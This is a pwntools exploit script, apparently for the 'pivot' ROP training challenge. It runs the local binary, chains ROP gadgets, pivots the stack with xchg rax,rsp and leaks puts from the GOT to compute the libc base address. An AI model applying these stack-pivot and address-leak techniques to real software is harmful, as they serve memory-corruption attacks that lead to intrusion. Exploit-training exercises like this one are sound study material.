from pwn import *

context(arch='amd64', os='linux')
binary_name = 'pivot'
p = process('./'+binary_name)
# gdb.attach(p, 'break main')
elf =  ELF(binary_name)
libc_so = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_pivot = ELF("libpivot.so")
rop =  ROP(elf)

# 0x0000000000400b02 : xchg rax, rsp ; ret
xchg_rax_rsp = 0x400b02
# 0x0000000000400b00 : pop rax ; ret
pop_rax =      0x400b00

foothold_function_PLT = elf.plt["foothold_function"]
MAIN_PLT = elf.symbols['main']
PUTS_PLT = elf.plt['puts']
puts_GOT = elf.got["puts"]
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

received = p.recvuntil("> ")
pivot_address = received.split("pivot: ")[1].split("\n")[0]
pivot_address_hexa = int(pivot_address, 16)

rop1  = ""
rop1 += p64(foothold_function_PLT)
rop1 += p64(foothold_function_PLT) + p64(pop_rdi) + p64(puts_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
p.sendline(rop1)
recv = (p.recvline())

stack_pivot = "A" * 40 + p64(pop_rax) + p64(pivot_address_hexa) + p64(xchg_rax_rsp) 
p.sendline(stack_pivot)

recv = p.recvline()
leaked_address = recv.replace("\n","").replace("> ","")[-6:].ljust(8, "\x00")

libc_so.address = u64(leaked_address) - libc_so.symbols["puts"]

log.info("foothold_function plt:   " + hex(foothold_function_PLT))
log.info("Main start:              " + hex(MAIN_PLT))
log.info("Puts plt:                " + hex(PUTS_PLT))
log.info("puts GOT:                " + hex(puts_GOT))
log.info("pop rdi; ret:            " + hex(pop_rdi))
log.info("Pivot address:           " + str(pivot_address))
log.info("libc.so.6 base address:  " + hex(libc_so.address))
log.info("puts leaked address:     " + (leaked_address))